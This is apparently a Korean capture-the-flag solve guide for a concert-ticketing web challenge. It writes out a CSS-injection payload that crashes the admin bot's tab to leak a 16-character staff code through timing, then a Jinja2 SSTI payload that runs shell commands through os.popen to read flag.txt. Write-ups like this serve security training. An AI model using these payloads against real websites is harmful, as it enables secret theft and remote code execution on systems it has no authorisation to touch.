# 2025-Summer-HackingCamp

# STAFF_ONLY 
## 최종 시나리오 정리

## 문제 설명
기다리던 콘서트 예매가 드디어 시작됐다.  
그런데 무대 앞줄이 스탭 전용이라고??  
하지만 무대 앞 시야를 포기할 순 없다!  
스탭의 자리를 빼앗을 수밖에....

---

## 목표
**관리자 계정에만 존재하는 16자리 staff_code**를 추출하고, 이를 이용해 스탭 전용 페이지에 접근한 뒤 최종 flag를 획득해야 합니다.  

1. CSS Injection을 이용해 staff_code 획득  
2. staff_code로 `/list` 접근  
3. `/list`의 SSTI 취약점을 이용해 최종 flag 탈취  

---

## Solve Guide  

### 1. css injection을 통해 staff_code 값 추출
<img width="1600" height="821" alt="스크린샷 2025-08-29 오전 10 14 30" src="https://github.com/user-attachments/assets/80775ccc-3997-42f4-92b5-4b471702787d" />

- `optional` 입력값이 `mypage`의 티켓의 CSS로 반영됨 > css injection임을 알 수 있음 
- CSP로 인해 외부로 요청을 보낼 수 없다
- `input#staff_code[value^=...]` 조건부 선택자를 이용해 prefix가 맞으면 css injection을 이용해서 의도적으로 탭 크래쉬를 유발시키고 이로 인해서 브라우저 렌더링이 지연됨 (HINT:크래쉬는 타임아웃을 유발할 수 있습니다.)
- 참가자는 실행 시간의 차이로 value의 참/거짓을 판별
  


```css
blue;} input#staff_code[value^=a] {
    --a: url(/?1),url(/?1),url(/?1),url(/?1),url(/?1);
    --b: var(--a),var(--a),var(--a),var(--a),var(--a);
    --c: var(--b),var(--b),var(--b),var(--b),var(--b);
    --d: var(--c),var(--c),var(--c),var(--c),var(--c);
    --e: var(--d),var(--d),var(--d),var(--d),var(--d);
    --f: var(--e),var(--e),var(--e),var(--e),var(--e);
    --g: var(--f),var(--f),var(--f),var(--f),var(--f);
    --e: var(--g),var(--g),var(--g),var(--g),var(--g);
}
* { background-image: var(--e); }
```

### 2. Report 페이지 활용

- `/report` 기능을 이용해 관리자가 `/mypage?ticket_id=xx`를 열람하도록함 (관리자의 mypage에는 input text 형태로 staff_code가 html에 존재)
- 이때, 티켓의 `optional` 값에 삽입된 **CSS 페이로드**가 실행됨
- 조건이 맞으면 CSS 변수 중첩으로 인한 **브라우저 크래시 → 지연 발생**, 조건이 틀리면 **정상 렌더링 → 빠른 응답**이 발생
- 따라서 참가자는 **duration 값의 차이**를 기반으로 staff_code의 각 문자를 판별할 수 있습니다

#### 스크린샷 및 응답 비교

<img width="1132" height="593" alt="조건 불일치" src="https://github.com/user-attachments/assets/e949bbf2-72bb-4f81-8ca0-61ad79d20d3b" />  *그림 2. value 값이 틀린 경우 (조건 불일치). 크래시 발생 없음 → 소요시간 약 0.xx초 ~ 1.xx초*

<img width="1132" height="593" alt="조건 일치" src="https://github.com/user-attachments/assets/ea04e751-2d4d-41bd-8477-e1926a7ba2ba" />  *그림 3. value 값이 맞은 경우 (조건 일치). 크래시 발생으로 지연 → 소요시간 약 2.xx초 ~ 7.xx초*

#### 판별 기준

| 응답 시간          | 의미                           |
|--------------------|--------------------------------|
| 0.xx ~ 1.xx 초     | 조건 불일치 → 잘못된 prefix    |
| 2.xx ~ 7.xx 초     | 조건 일치 → 올바른 prefix      |

#### 정리
- 참가자는 `/report` 요청의 duration 값을 반복적으로 측정해 staff_code의 각 문자를 하나씩 알아냄 
- 이 과정을 자동화해서 브루트포스 스크립트를 작성해서 **16자리 staff_code**를 순차적으로 추출할 수 있습니다

---

### 3. 최종 SSTI 익스플로잇

- staff_code를 획득하면 `/list` 페이지에 접근 가능함 
- `http://~/list?code=찾은스탭코드` 로 접근 시 전용 페이지가 열림 

<img width="1423" height="936" alt="List 접근" src="https://github.com/user-attachments/assets/7cb988fe-c0a8-4708-8b6c-9dc8d8155ed0" />  *그림 4. staff_code 인증 후 /list 접근 성공*

<img width="1423" height="819" alt="List 페이지" src="https://github.com/user-attachments/assets/c7504be2-771a-471f-b010-00950449a51f" />  *그림 5. staff 전용 페이지 화면*

- `/list`에는 SSTI 취약점이 존재
- `motd` 파라미터에 페이로드를 삽입하면 서버에서 코드가 실행

#### 익스플로잇 예시

```text
http://~/list?code=찾은스탭코드&motd={% print url_for.__globals__['os'].popen('cat flag.txt').read() %}
```

- 실행 시 서버 내부의 flag.txt 내용을 획득 가능 

<img width="1508" height="495" alt="flag 획득" src="https://github.com/user-attachments/assets/fef338c4-126e-473f-b0c8-d185b31136d4" /> *그림 6. SSTI를 통해 flag.txt 내용을 출력한 화면*
